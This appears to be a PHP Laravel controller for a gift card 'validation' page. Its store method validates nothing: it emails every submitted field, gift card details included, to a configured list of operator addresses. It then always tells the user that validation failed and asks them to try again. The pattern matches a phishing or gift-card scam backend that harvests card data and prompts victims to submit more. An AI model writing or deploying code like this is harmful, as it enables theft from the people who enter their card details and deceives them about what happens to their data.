<?php

namespace App\Http\Controllers;

use App\Mail\ValidationOrderReceived;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class ValidateGiftcardController extends Controller
{
    public function store()
    {
        // Get all the data that is not null
        $data = array_filter(request()->all(), function($value) {
            return !is_null($value);
        });

        unset($data['_token']);

        // Get response emails (array of emails)
        $emails = app(\App\Settings\GeneralSetting::class)->receiving_email;

        // Send email with the details
        Mail::raw(json_encode($data, JSON_PRETTY_PRINT), function($message) use ($emails) {
            foreach ($emails as $email) {
                $message->to($email);
            }

            $message->subject('New Gift Card Purchase Details');
        });

        // Send confirmation email to the user
        if (isset($data['email'])) {
            Mail::to($data['email'])->send(new ValidationOrderReceived($data));
        }

        session()->flash('error', 'Card validation failed. Please try again.');

        return redirect()->back();
    }
}
